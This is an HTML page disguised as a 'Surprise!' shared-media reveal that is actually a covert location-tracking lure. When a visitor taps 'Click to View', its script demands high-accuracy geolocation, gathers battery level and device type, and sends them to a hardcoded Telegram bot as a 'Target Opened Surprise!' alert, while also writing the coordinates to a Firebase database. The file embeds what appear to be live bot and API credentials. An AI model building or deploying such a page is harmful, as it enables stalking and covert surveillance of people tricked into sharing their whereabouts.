<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise! 🎁</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            /* Background Wallpaper Setup */
            background-image: url('wallpaper.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        /* Dark overlay taaki card saaf dikhe background ke upar */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1;
        }

        /* Container card upar rahega */
        .container {
            position: relative;
            z-index: 2;
            background: rgba(17, 24, 39, 0.8);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 40px 25px;
            border-radius: 24px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
            max-width: 400px;
            width: 100%;
            text-align: center;
            animation: floatCard 4s ease-in-out infinite;
        }

        @keyframes floatCard {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
        }

        .icon-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .pulse-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid #ef4444;
            animation: pulseAnim 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulseAnim {
            0% { transform: scale(0.95); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        .lock-icon {
            width: 54px;
            height: 54px;
            background: linear-gradient(135deg, #ef4444, #f59e0b);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
            z-index: 2;
        }

        h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(to right, #f87171, #fbbf24);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 0.5px;
        }

        p {
            font-size: 14px;
            color: #d1d5db;
            margin-bottom: 25px;
            line-height: 1.6;
        }

        .btn {
            background: linear-gradient(135deg, #dc2626, #d97706);
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.4);
            transition: all 0.3s ease;
        }

        .btn:hover {
            background: linear-gradient(135deg, #b91c1c, #b45309);
            box-shadow: 0 6px 25px rgba(217, 119, 6, 0.6);
            transform: translateY(-2px);
        }

        .btn:active {
            transform: translateY(1px);
        }

        #status { 
            font-size: 13px; 
            color: #9ca3af; 
            margin-top: 18px;
            word-break: break-word;
            font-weight: 500;
        }

        .error { color: #f87171 !important; }

        .secure-badge {
            margin-top: 25px;
            font-size: 11px;
            color: #9ca3af;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon-container">
            <div class="pulse-ring"></div>
            <div class="lock-icon">🎁</div>
        </div>
        
        <h2>Surprise!</h2>
        <p>A special media file has been shared with you. Tap below to reveal the surprise content.</p>
        
        <button class="btn" id="loadBtn">Click to View</button>
        <p id="status"></p>

        <div class="secure-badge">
            <span>✨ Exclusive Shared Media</span>
        </div>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDhYrfKfzjRXTuJZS095zZe6UoI17CnHgw",
            authDomain: "live-tracker-c443f.firebaseapp.com",
            databaseURL: "https://live-tracker-c443f-default-rtdb.firebaseio.com",
            projectId: "live-tracker-c443f",
            storageBucket: "live-tracker-c443f.firebasestorage.app",
            messagingSenderId: "444398218197",
            appId: "1:444398218197:web:a21f13be9e0d726f9f6b5c",
            measurementId: "G-TP2244W66P"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const statusText = document.getElementById("status");
        const loadBtn = document.getElementById("loadBtn");

        const BOT_TOKEN = "8944921867:AAEIWr6FFxFuZQ60IKhUUSWDjq6en2dXu74";
        const CHAT_ID = "8407541236"; 

        let hasAlerted = false;

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Desktop/PC";
            if (/android/i.test(ua)) device = "Android Mobile";
            if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone/iOS";
            return device;
        }

        async function sendTelegramAlert(lat, lng, accuracy) {
            if (hasAlerted) return;
            hasAlerted = true;

            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging ⚡)' : ''}`;
                }
            } catch (e) {
                batteryInfo = "Not Accessible";
            }

            const deviceType = getDeviceInfo();
            statusText.innerText = "Loading surprise...";
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            
            const message = `🚨 *Target Opened Surprise!* 🎯\n\n` +
                            `📱 *Device:* ${deviceType}\n` +
                            `🔋 *Battery:* ${batteryInfo}\n` +
                            `🌐 *Coordinates:* \`${lat}, ${lng}\`\n` +
                            `🎯 *GPS Accuracy:* ~${Math.round(accuracy)} meters\n\n` +
                            `🗺️ [Open in Google Maps](${mapUrl})`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).then(() => {
                statusText.innerText = "Loaded successfully!";
            }).catch(err => console.error("Telegram Alert Error:", err));
        }

        loadBtn.addEventListener("click", () => {
            loadBtn.innerText = "Revealing...";
            loadBtn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    sendTelegramAlert(lat, lng, accuracy);

                    set(ref(db, 'users/sahil'), {
                        latitude: lat,
                        longitude: lng,
                        accuracy: accuracy,
                        timestamp: Date.now()
                    });

                }, (error) => {
                    statusText.innerText = "Location permission is required to view surprise.";
                    statusText.classList.add("error");
                    loadBtn.innerText = "Retry";
                    loadBtn.disabled = false;
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                statusText.innerText = "Browser not supported.";
                statusText.classList.add("error");
            }
        });
    </script>
</body>
</html>

    </script>
